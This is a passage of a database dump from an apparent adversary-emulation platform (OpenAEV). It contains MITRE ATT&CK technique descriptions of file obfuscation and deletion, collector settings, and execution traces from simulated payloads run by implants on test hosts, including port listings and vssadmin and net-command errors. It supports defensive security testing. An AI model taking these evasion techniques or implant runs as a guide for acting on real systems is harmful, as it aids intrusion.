48226f44-f8ee-42e2-ab01-796507a3a546	2026-01-09 14:19:26.927341+00	2026-01-09 14:19:26.927364+00	Encrypted/Encoded File	Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.	T1027.013	{}	{}	\N	attack-pattern--0493888d-2f70-4714-952e-fbece298ebc3
d9fcb08c-48c5-4257-a4a4-eafd63c3afd4	2026-01-09 14:19:27.216867+00	2026-01-09 14:19:27.216887+00	File Deletion	Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and `rm` on ESXi.	T1070.004	{}	{}	\N	attack-pattern--142f7b18-3c9a-4224-8b6c-522a533546bc
\.


--
-- Data for Name: attack_patterns_kill_chain_phases; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.attack_patterns_kill_chain_phases (attack_pattern_id, phase_id) FROM stdin;
cf178ab6-ddc5-4140-a47e-dab9d72607a8	300d7fd4-d933-4c55-bb2d-e618ef48a44b
1af1d8b9-d207-43de-acdf-97f770b42388	43e359e0-03f6-4762-a268-c92466c87962
5a9373ec-b51b-4aa7-b2c7-d6035fa2acde	7dc074be-e649-4597-a977-a69db1f8f553
93f4b270-e7b6-4c21-abfb-bfc79cfe4477	fbaba4f5-7f73-49ca-9522-55d1a956473e
42fcd04d-91af-4398-83fc-49bc10058bf7	cd7cc761-74dc-4ac7-9d42-aad2db481b9e
be317029-11ff-4692-9d17-53d7880134ab	3debd8b9-b6f2-4245-881e-b13454d03549
10b4df1e-61a5-4728-96b4-29f0feecb285	a01d46ef-7c20-490a-a36e-fd7c3a271820
10b4df1e-61a5-4728-96b4-29f0feecb285	ccfc794e-6739-41bc-9652-b2f70224c56f
bcdfaef2-a29f-4c14-8024-b6390ac2e02f	d46ee5cc-0ef4-4f59-a0b7-ba9c2fb9c993
24053ce0-1450-49f5-bb4c-56f2413fbf78	74ac7969-7326-49fc-b068-4580890e6d02
\.


--
-- Data for Name: challenge_attempts; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.challenge_attempts (challenge_id, inject_status_id, user_id, challenge_attempt, attempt_created_at, attempt_updated_at) FROM stdin;
\.


--
-- Data for Name: challenges; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.challenges (challenge_id, challenge_created_at, challenge_updated_at, challenge_name, challenge_flag, challenge_category, challenge_content, challenge_score, challenge_max_attempts) FROM stdin;
\.


--
-- Data for Name: challenges_documents; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.challenges_documents (challenge_id, document_id) FROM stdin;
\.


--
-- Data for Name: challenges_flags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.challenges_flags (flag_id, flag_created_at, flag_updated_at, flag_type, flag_value, flag_challenge) FROM stdin;
\.


--
-- Data for Name: challenges_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.challenges_tags (challenge_id, tag_id) FROM stdin;
\.


--
-- Data for Name: channels; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.channels (channel_id, channel_created_at, channel_updated_at, channel_name, channel_type, channel_description, channel_logo_dark, channel_logo_light, channel_primary_color_dark, channel_primary_color_light, channel_secondary_color_dark, channel_secondary_color_light, channel_mode) FROM stdin;
\.


--
-- Data for Name: collectors; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.collectors (collector_id, collector_created_at, collector_updated_at, collector_name, collector_type, collector_period, collector_last_execution, collector_external, collector_security_platform, collector_state) FROM stdin;
acab8214-0379-448a-a575-05e9d934eadd	2026-01-09 14:19:19.092782+00	2026-01-09 14:19:19.092787+00	Expectations Vulnerability Manager	openaev_expectations_vulnerability_manager	0	\N	f	\N	\N
96e476e0-b9c4-4660-869c-98585adf754d	2026-01-09 14:19:19.141615+00	2026-01-09 14:19:19.141619+00	Expectations Expiration Manager	openaev_fake_detector	0	\N	f	\N	\N
63544750-19a1-435f-ada4-b44e39cf3cdb	2026-01-09 14:19:31.24734+00	2026-01-16 10:18:35.737364+00	OpenAEV Datasets	openaev_openaev	86400	\N	t	\N	\N
3050d2a3-291d-44eb-8038-b4e7dd107436	2026-01-09 14:19:31.241867+00	2026-01-16 10:18:35.737364+00	MITRE ATT&CK	openaev_mitre_attack	604800	\N	t	\N	\N
2caac5d2-31c7-4804-adfd-f92d1b2e7eda	2026-01-09 14:19:31.274835+00	2026-01-16 10:18:35.73801+00	CVE by NVD NIST	openaev_nvd_nist_cve	7200	\N	t	\N	\N
c34e3f19-e0b9-45cb-83e0-3b329e4c53d3	2026-01-09 14:19:31.232989+00	2026-01-16 10:18:35.741336+00	Atomic Red Team	openaev_atomic_red_team	86400	\N	t	\N	\N
\.


--
-- Data for Name: comchecks; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.comchecks (comcheck_id, comcheck_exercise, comcheck_start_date, comcheck_end_date, comcheck_state, comcheck_subject, comcheck_message, comcheck_name) FROM stdin;
\.


--
-- Data for Name: comchecks_statuses; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.comchecks_statuses (status_id, status_user, status_comcheck, status_sent_date, status_receive_date, status_sent_retry) FROM stdin;
\.


--
-- Data for Name: communications; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.communications (communication_id, communication_received_at, communication_sent_at, communication_subject, communication_content, communication_message_id, communication_inject, communication_ack, communication_animation, communication_content_html, communication_from, communication_to, communication_attachments) FROM stdin;
\.


--
-- Data for Name: communications_users; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.communications_users (communication_id, user_id) FROM stdin;
\.


--
-- Data for Name: contract_output_elements; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.contract_output_elements (contract_output_element_id, contract_output_element_is_finding, contract_output_element_rule, contract_output_element_name, contract_output_element_key, contract_output_element_type, contract_output_element_output_parser_id, contract_output_element_created_at, contract_output_element_updated_at) FROM stdin;
\.


--
-- Data for Name: contract_output_elements_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.contract_output_elements_tags (contract_output_element_id, tag_id) FROM stdin;
\.


--
-- Data for Name: custom_dashboards; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.custom_dashboards (custom_dashboard_id, custom_dashboard_name, custom_dashboard_description, custom_dashboard_created_at, custom_dashboard_updated_at) FROM stdin;
126a5c9a-1803-47f2-9f27-458d846ce6b4	Tabletop Exercice simulation		2026-01-09 14:19:31.866617+00	2026-01-09 14:19:31.866637+00
766b1ffb-d664-47bd-941d-38d35b1ea6fb	Tabletop Exercice scenario		2026-01-09 14:19:31.973882+00	2026-01-09 14:19:31.973901+00
d02a5fec-41fc-416b-9e8f-8c89a89fa829	Technical home		2026-01-09 14:19:32.133716+00	2026-01-09 14:19:32.133742+00
7f92d0b7-3535-4414-80e8-0eed5c2068e0	Technical scenario		2026-01-09 14:19:32.258859+00	2026-01-09 14:19:32.258876+00
71de8342-011e-4cac-a8ab-477cb0770756	Technical simulation		2026-01-09 14:19:32.413664+00	2026-01-09 14:19:32.413674+00
a3964671-ee00-48a6-bb94-7cc80d7170a3	Tabletop Exercice home		2026-01-09 14:19:32.493908+00	2026-01-09 14:19:32.493921+00
\.


--
-- Data for Name: custom_dashboards_parameters; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.custom_dashboards_parameters (custom_dashboards_parameter_id, custom_dashboard_id, custom_dashboards_parameter_name, custom_dashboards_parameter_type) FROM stdin;
07723e82-6531-4239-9d8c-c9f169ebbb74	126a5c9a-1803-47f2-9f27-458d846ce6b4	End date	endDate
4e76f1ef-6bca-43bc-ada4-adf3091af1e3	126a5c9a-1803-47f2-9f27-458d846ce6b4	Start date	startDate
6d49c8f0-2b57-4cf5-8d3f-c4ff63459959	126a5c9a-1803-47f2-9f27-458d846ce6b4	Time range	timeRange
315f703e-35db-4564-af22-08cfc29e7286	126a5c9a-1803-47f2-9f27-458d846ce6b4	simulation	simulation
cb785cac-7ba0-4569-b08b-27ad84a424ab	766b1ffb-d664-47bd-941d-38d35b1ea6fb	Time range	timeRange
6c9d8beb-57e1-4bb1-91e1-00554d81b5dc	766b1ffb-d664-47bd-941d-38d35b1ea6fb	Scenario	scenario
49899b94-875c-4a13-8aed-3c57b2a3a4de	766b1ffb-d664-47bd-941d-38d35b1ea6fb	Start date	startDate
c1aec402-9632-4e40-88aa-794d374c6163	766b1ffb-d664-47bd-941d-38d35b1ea6fb	End date	endDate
ecaec426-2ce1-4d01-88d0-7bafe7813665	d02a5fec-41fc-416b-9e8f-8c89a89fa829	End date	endDate
eb6b930e-eccc-46b7-98c1-ac7504a96c6d	d02a5fec-41fc-416b-9e8f-8c89a89fa829	Time range	timeRange
8ef259f5-3daa-459e-b749-8623cb5a67a6	d02a5fec-41fc-416b-9e8f-8c89a89fa829	Start date	startDate
0a134efb-1dc2-4c00-b9d8-4b58b7c732f5	7f92d0b7-3535-4414-80e8-0eed5c2068e0	Scenario	scenario
9689b7e0-ea43-44d8-9637-a9fba9001a56	7f92d0b7-3535-4414-80e8-0eed5c2068e0	Time range	timeRange
a1deeaf1-15d1-419c-a8af-4f9f26920577	7f92d0b7-3535-4414-80e8-0eed5c2068e0	simulation	simulation
23b11da4-c715-48b1-b02b-9d98098bd753	7f92d0b7-3535-4414-80e8-0eed5c2068e0	Start date	startDate
5e1de59e-3d40-4f4a-ac99-9fbb6dbd4ff8	7f92d0b7-3535-4414-80e8-0eed5c2068e0	End date	endDate
9f8061a2-7a8d-4967-8588-64f80e3f87be	71de8342-011e-4cac-a8ab-477cb0770756	simulation	simulation
3b6a7773-4853-4ea8-abd7-05f2b1b775ac	71de8342-011e-4cac-a8ab-477cb0770756	End date	endDate
861e576a-bce1-49a7-b87e-ed4965bbf8dc	71de8342-011e-4cac-a8ab-477cb0770756	Start date	startDate
03dd2d0b-1d7c-4164-a71a-174267d59c34	71de8342-011e-4cac-a8ab-477cb0770756	Time range	timeRange
68884e56-b5a4-44be-bd43-8612414ea9de	a3964671-ee00-48a6-bb94-7cc80d7170a3	End date	endDate
8443b154-dd43-468e-8710-30bb44d31c81	a3964671-ee00-48a6-bb94-7cc80d7170a3	Start date	startDate
1675a2a4-3e27-483c-b49e-10995e341054	a3964671-ee00-48a6-bb94-7cc80d7170a3	Time range	timeRange
\.


--
-- Data for Name: cwes; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.cwes (cwe_id, cwe_external_id, cwe_source, cwe_created_at, cwe_updated_at) FROM stdin;
14934e8b-f131-46ee-b2c9-ec722d96ada3	CWE-918	NVD	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
95524e88-cd6e-4110-beed-f7c2f4956971	CWE-420	NVD	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
773982ea-ae46-4da6-99e9-300f46bf4cdd	CWE-287	NVD	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
ff2c6388-dc11-4f7a-bf1d-8bd8befd89be	CWE-789	NVD	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
86e85188-cc74-4699-9c04-d116079636dd	CWE-416	MITRE	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
f6be365e-d04d-4228-8ffa-07f0bb787da0	CWE-787	Out-of-bounds Write	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
f3383292-d488-457b-a7d2-a708a3065f94	CWE-78	Nist	2026-01-09 14:18:39.861122+00	2026-01-09 14:18:39.861122+00
\.


--
-- Data for Name: detection_remediations; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.detection_remediations (detection_remediation_id, detection_remediation_payload_id, detection_remediation_values, detection_remediation_created_at, detection_remediation_updated_at, detection_remediation_collector_type, author_rule) FROM stdin;
\.


--
-- Data for Name: documents; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.documents (document_id, document_name, document_description, document_type, document_target) FROM stdin;
b09e4d2f-74e4-4d02-add7-7b65b078cce1	c34e3f19-e0b9-45cb-83e0-3b329e4c53d3.png	\N	image/png	90567c67a8dafbc9aed2e2c7058f7de1.png
435cc834-6596-4d2c-b240-dc78f5fdb069	3050d2a3-291d-44eb-8038-b4e7dd107436.png	\N	image/png	ab6d67f6b23f980b4794fe52f49182ab.png
c78ed2d1-dde5-41d9-947e-c2e85e05beee	63544750-19a1-435f-ada4-b44e39cf3cdb.png	\N	image/png	4a9c170b98d7da451fe63ef6e06060ff.png
71c1342f-c1c2-4adf-bdd5-30c160b86759	2caac5d2-31c7-4804-adfd-f92d1b2e7eda.png	\N	image/png	eeafecf380a34a6628cb2e46e68064a1.png
\.


--
-- Data for Name: documents_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.documents_tags (document_id, tag_id) FROM stdin;
\.


--
-- Data for Name: evaluations; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.evaluations (evaluation_id, evaluation_score, evaluation_objective, evaluation_user, evaluation_created_at, evaluation_updated_at) FROM stdin;
\.


--
-- Data for Name: execution_traces; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.execution_traces (execution_trace_id, execution_inject_status_id, execution_inject_test_status_id, execution_agent_id, execution_message, execution_action, execution_status, execution_time, execution_created_at, execution_updated_at, execution_context_identifiers, execution_structured_output) FROM stdin;
09448606-eb73-41ff-915f-9d4ec5f6f0c6	7fc8b978-95a6-4f57-9d36-1737195b0e2d	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Implant is up and starting execution	START	INFO	2026-01-09 15:30:15.550998	2026-01-09 15:30:15.653999+00	2026-01-09 15:30:15.654007+00	{}	\N
e77dec27-b7ea-4d0d-b4ad-62d910dfba74	7fc8b978-95a6-4f57-9d36-1737195b0e2d	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"","stderr":"","exit_code":0}	EXECUTION	SUCCESS	2026-01-09 15:30:16.478998	2026-01-09 15:30:16.872587+00	2026-01-09 15:30:16.872596+00	{}	\N
3e626768-6aea-4731-b56d-229fbdc55cec	7fc8b978-95a6-4f57-9d36-1737195b0e2d	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Payload completed	COMPLETE	SUCCESS	2026-01-09 15:30:17.079998	2026-01-09 15:30:17.047288+00	2026-01-09 15:30:17.047295+00	{}	\N
f3fa2379-89c5-426c-bde3-a73f7b49e79c	0447072f-45f7-4064-bbcf-a16f45b1bc61	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Implant is up and starting execution	START	INFO	2026-01-09 15:32:31.099986	2026-01-09 15:32:31.248561+00	2026-01-09 15:32:31.248611+00	{}	\N
01cb264c-2e2f-49c7-ace0-845d06af2edf	0447072f-45f7-4064-bbcf-a16f45b1bc61	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"","stderr":"","exit_code":0}	EXECUTION	SUCCESS	2026-01-09 15:32:31.779986	2026-01-09 15:32:32.04672+00	2026-01-09 15:32:32.046738+00	{}	\N
417fccf2-a973-47f2-95a3-4875f832850c	0447072f-45f7-4064-bbcf-a16f45b1bc61	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Payload completed	COMPLETE	SUCCESS	2026-01-09 15:32:32.191986	2026-01-09 15:32:32.101119+00	2026-01-09 15:32:32.101127+00	{}	\N
90edb054-5813-4d3d-87d7-889b09b498af	aa4e4e50-a430-4876-8f7a-abfcea19232f	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Implant is up and starting execution	START	INFO	2026-01-09 15:33:31.869423	2026-01-09 15:33:31.946229+00	2026-01-09 15:33:31.94624+00	{}	\N
1a56307b-0aca-4657-8e35-4b0ab4a5a175	aa4e4e50-a430-4876-8f7a-abfcea19232f	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"FOUND: IP=10.0.0.18 (No Hostname)\\n","stderr":"","exit_code":0}	EXECUTION	SUCCESS	2026-01-09 15:34:11.917423	2026-01-09 15:34:12.289754+00	2026-01-09 15:34:12.289767+00	{}	\N
272e1fc3-0931-4cfd-b51b-15c5bbfd1022	aa4e4e50-a430-4876-8f7a-abfcea19232f	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Payload completed	COMPLETE	SUCCESS	2026-01-09 15:34:12.404423	2026-01-09 15:34:12.522678+00	2026-01-09 15:34:12.522691+00	{}	\N
f8951431-e959-4c73-af5c-dcf1b35cc84c	da07f8e8-0716-42e6-9e59-1f233be0b471	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Implant is up and starting execution	START	INFO	2026-01-09 15:35:18.297235	2026-01-09 15:35:18.446287+00	2026-01-09 15:35:18.446299+00	{}	\N
32cc5ccf-ac34-40b5-88c7-e7f693e346c2	da07f8e8-0716-42e6-9e59-1f233be0b471	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"","stderr":"Accès refusé. (os error 5)","exit_code":1}	EXECUTION	MAYBE_PREVENTED	2026-01-09 15:35:18.636235	2026-01-09 15:35:19.031469+00	2026-01-09 15:35:19.03148+00	{}	\N
f377f49c-50cc-42bb-9a44-43335ae5c430	981db260-aa30-481b-ba8b-b76218392d54	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Implant is up and starting execution	START	INFO	2026-01-09 15:35:19.052566	2026-01-09 15:35:19.125267+00	2026-01-09 15:35:19.125433+00	{}	\N
4ac83952-1974-4d6b-acde-387f5e333012	da07f8e8-0716-42e6-9e59-1f233be0b471	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Payload completed	COMPLETE	MAYBE_PREVENTED	2026-01-09 15:35:19.129235	2026-01-09 15:35:19.148969+00	2026-01-09 15:35:19.148978+00	{}	\N
2bf21be0-4893-4936-ac1b-68010345df7f	981db260-aa30-481b-ba8b-b76218392d54	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"","stderr":"","exit_code":0}	EXECUTION	SUCCESS	2026-01-09 15:37:32.476566	2026-01-09 15:37:32.729383+00	2026-01-09 15:37:32.72939+00	{}	\N
6c1fa1a6-a3d3-4457-9bb6-8d66d9d61fc3	981db260-aa30-481b-ba8b-b76218392d54	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Payload completed	COMPLETE	SUCCESS	2026-01-09 15:37:32.934566	2026-01-09 15:37:32.813263+00	2026-01-09 15:37:32.813271+00	{}	\N
228904a9-e96c-422d-b359-b2b9ef0038c2	9a5c1f35-9a30-4dfc-93fc-41c96d04715b	\N	19213a51-c939-4f40-9607-b93608da8f90	Implant is up and starting execution	START	INFO	2026-01-09 15:37:43.079779	2026-01-09 15:37:43.233747+00	2026-01-09 15:37:43.233755+00	{}	\N
8a76cda3-de25-4105-ad08-9190c433c609	9a5c1f35-9a30-4dfc-93fc-41c96d04715b	\N	19213a51-c939-4f40-9607-b93608da8f90	{"stdout":"","stderr":"","exit_code":0}	EXECUTION	SUCCESS	2026-01-09 15:37:44.443779	2026-01-09 15:37:44.849832+00	2026-01-09 15:37:44.849838+00	{}	\N
14d1c4ef-8df2-4f62-9523-b7c351b98f2b	9a5c1f35-9a30-4dfc-93fc-41c96d04715b	\N	19213a51-c939-4f40-9607-b93608da8f90	Payload completed	COMPLETE	SUCCESS	2026-01-09 15:37:44.972779	2026-01-09 15:37:45.012719+00	2026-01-09 15:37:45.01273+00	{}	\N
7a22bc0e-1ee2-4a61-bc97-e0c1b560e5f9	3b12b8a5-1851-4da2-8448-7ddc16af3485	\N	19213a51-c939-4f40-9607-b93608da8f90	Implant is up and starting execution	START	INFO	2026-01-09 15:39:43.404855	2026-01-09 15:39:43.681014+00	2026-01-09 15:39:43.681023+00	{}	\N
6a395169-eb79-4153-8bc3-fe1a4e7e7657	3b12b8a5-1851-4da2-8448-7ddc16af3485	\N	19213a51-c939-4f40-9607-b93608da8f90	{"stdout":"La commande s'est termin�e correctement.\\r\\n\\r\\n","stderr":"L'erreur syst�me 1376 s'est produite.\\r\\n\\r\\nLe groupe local sp�cifi� n'existe pas.\\r\\n\\r\\n","exit_code":2}	EXECUTION	MAYBE_PREVENTED	2026-01-09 15:39:44.552855	2026-01-09 15:39:44.972944+00	2026-01-09 15:39:44.972951+00	{}	\N
0bc803f1-b1b2-4e94-8619-74fa54b121c8	3b12b8a5-1851-4da2-8448-7ddc16af3485	\N	19213a51-c939-4f40-9607-b93608da8f90	Payload completed	COMPLETE	MAYBE_PREVENTED	2026-01-09 15:39:45.035855	2026-01-09 15:39:45.125112+00	2026-01-09 15:39:45.125121+00	{}	\N
a82b70b4-8d42-48cd-8243-0920feb9bfe1	b23b845f-bdbf-4793-942c-d6a05c46490b	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Implant is up and starting execution	START	INFO	2026-01-09 15:40:19.060979	2026-01-09 15:40:19.354816+00	2026-01-09 15:40:19.354869+00	{}	\N
93cba035-c3cc-47eb-ade3-96fa909ca48d	b23b845f-bdbf-4793-942c-d6a05c46490b	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"vssadmin 1.1 - Outil ligne de commande d’administration du service de cliché instantané de volume\\r\\n(C) Copyright 2001-2013 Microsoft Corp.\\r\\n\\r\\nErreur :  Vous ne disposez pas des autorisations correctes pour exécuter cette commande. Exécutez \\r\\ncet utilitaire à partir d’une fenêtre de commande disposant de privilèges d’administration élevés.\\r\\n \\r\\n","stderr":"","exit_code":2}	EXECUTION	MAYBE_PREVENTED	2026-01-09 15:40:20.937979	2026-01-09 15:40:21.387833+00	2026-01-09 15:40:21.387841+00	{}	\N
061c6a31-7a81-4f2c-8bf1-2f648b694c93	b23b845f-bdbf-4793-942c-d6a05c46490b	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Payload completed	COMPLETE	MAYBE_PREVENTED	2026-01-09 15:40:21.606979	2026-01-09 15:40:21.454972+00	2026-01-09 15:40:21.454981+00	{}	\N
54e7c6c0-149f-4b11-9525-2090a480d18a	4827180e-a153-41c9-bc16-0208eddb1309	\N	19213a51-c939-4f40-9607-b93608da8f90	Implant is up and starting execution	START	INFO	2026-01-09 15:41:22.659469	2026-01-09 15:41:22.738573+00	2026-01-09 15:41:22.738582+00	{}	\N
5a6793df-5329-4bf4-93e1-175480e89b13	4827180e-a153-41c9-bc16-0208eddb1309	\N	19213a51-c939-4f40-9607-b93608da8f90	{"stdout":"\\r\\nLocalAddress                        LocalPort RemoteAddress                       RemotePort State       AppliedSetting\\r\\n------------                        --------- -------------                       ---------- -----       --------------\\r\\n::                                  49669     ::                                  0          Listen                    \\r\\n::                                  49668     ::                                  0          Listen                    \\r\\n::                                  49667     ::                                  0          Listen                    \\r\\n::                                  49666     ::                                  0          Listen                    \\r\\n::                                  49665     ::                                  0          Listen                    \\r\\n::                                  49664     ::                                  0          Listen                    \\r\\n::                                  47001     ::                                  0          Listen                    \\r\\n::                                  5985      ::                                  0          Listen                    \\r\\n::                                  445       ::                                  0          Listen                    \\r\\n::                                  135       ::                                  0          Listen                    \\r\\n0.0.0.0                             49669     0.0.0.0                             0          Listen                    \\r\\n0.0.0.0                             49668     0.0.0.0                             0          Listen                    \\r\\n0.0.0.0                             49667     0.0.0.0                             0          Listen                    \\r\\n0.0.0.0                             49666     0.0.0.0                             0          Listen                    \\r\\n0.0.0.0                             49665     0.0.0.0                             0          Listen                    \\r\\n0.0.0.0                             49664     0.0.0.0                             0          Listen                    \\r\\n10.0.0.44                           139       0.0.0.0                             0          Listen                    \\r\\n0.0.0.0                             135       0.0.0.0                             0          Listen                    \\r\\n","stderr":"","exit_code":0}	EXECUTION	SUCCESS	2026-01-09 15:41:28.005469	2026-01-09 15:41:28.314976+00	2026-01-09 15:41:28.314984+00	{}	\N
16227ca3-d739-4b7c-9b6c-8e4687daa3ca	4827180e-a153-41c9-bc16-0208eddb1309	\N	19213a51-c939-4f40-9607-b93608da8f90	Payload completed	COMPLETE	SUCCESS	2026-01-09 15:41:28.368469	2026-01-09 15:41:28.533715+00	2026-01-09 15:41:28.533725+00	{}	\N
9ae821aa-a1f2-4f28-b3ee-6fae89820da8	4d433da1-2d0d-4ee6-8880-875e18a80620	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Implant is up and starting execution	START	INFO	2026-01-09 15:53:42.37142	2026-01-09 15:53:42.436046+00	2026-01-09 15:53:42.436069+00	{}	\N
a212d63d-e036-4cbb-9bf5-459cc0aee017	2418eae2-e78e-42b4-9860-2039edd65772	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Implant is up and starting execution	START	INFO	2026-01-09 15:53:42.570815	2026-01-09 15:53:42.619423+00	2026-01-09 15:53:42.61943+00	{}	\N
44896f1d-98c9-42c5-8aa0-31b29bc4c87a	2418eae2-e78e-42b4-9860-2039edd65772	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"","stderr":"","exit_code":0}	EXECUTION	SUCCESS	2026-01-09 15:53:44.097815	2026-01-09 15:53:44.245599+00	2026-01-09 15:53:44.245607+00	{}	\N
936f0e09-3113-4d9e-bb02-cab4735075e8	4d433da1-2d0d-4ee6-8880-875e18a80620	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	{"stdout":"","stderr":"Le nom d'utilisateur est introuvable.\\r\\n\\r\\nVous obtiendrez une aide suppl�mentaire en entrant NET HELPMSG 2221.\\r\\n\\r\\n","exit_code":2}	EXECUTION	MAYBE_PREVENTED	2026-01-09 15:53:43.79842	2026-01-09 15:53:43.978731+00	2026-01-09 15:53:43.978741+00	{}	\N
b646ff0f-c667-49a6-8e5f-cb75f690456f	4d433da1-2d0d-4ee6-8880-875e18a80620	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Payload completed	COMPLETE	MAYBE_PREVENTED	2026-01-09 15:53:44.07442	2026-01-09 15:53:44.075135+00	2026-01-09 15:53:44.075143+00	{}	\N
c98522f2-09e1-4b9f-9abd-1e00bb5ca317	2418eae2-e78e-42b4-9860-2039edd65772	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Payload completed	COMPLETE	SUCCESS	2026-01-09 15:53:44.371815	2026-01-09 15:53:44.325206+00	2026-01-09 15:53:44.325213+00	{}	\N
02debd4b-a13b-4c1d-930d-f0ae4af9d06e	e7c3a653-fda8-4b41-8361-3e95292002a3	\N	19213a51-c939-4f40-9607-b93608da8f90	Implant is up and starting execution	START	INFO	2026-01-16 08:18:06.518882	2026-01-16 08:18:06.576271+00	2026-01-16 08:18:06.57632+00	{}	\N
b49473b7-b78b-4c34-ad04-ddad748e65de	e7c3a653-fda8-4b41-8361-3e95292002a3	\N	19213a51-c939-4f40-9607-b93608da8f90	{"stdout":"","stderr":"","exit_code":0}	EXECUTION	SUCCESS	2026-01-16 08:18:11.343882	2026-01-16 08:18:11.468588+00	2026-01-16 08:18:11.468592+00	{}	\N
47c35452-ef34-46f1-8e55-a386cbdfca52	e7c3a653-fda8-4b41-8361-3e95292002a3	\N	19213a51-c939-4f40-9607-b93608da8f90	{"stdout":"","stderr":"","exit_code":0}	CLEANUP_EXECUTION	SUCCESS	2026-01-16 08:18:07.469882	2026-01-16 08:18:12.477709+00	2026-01-16 08:18:12.477714+00	{}	\N
90756147-2bca-41e3-b830-e16d44e8e2a7	e7c3a653-fda8-4b41-8361-3e95292002a3	\N	19213a51-c939-4f40-9607-b93608da8f90	Payload completed	COMPLETE	SUCCESS	2026-01-16 08:18:12.514882	2026-01-16 08:18:12.510319+00	2026-01-16 08:18:12.510324+00	{}	\N
5159034a-a446-451b-b757-9bcdc7ded404	d522efe3-f72a-458e-8ce8-a0b2a8889ad7	\N	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb	Implant is up and starting execution	START	INFO	2026-01-16 08:45:29.401212	2026-01-16 08:45:29.477708+00	2026-01-16 08:45:29.477717+00	{}	\N
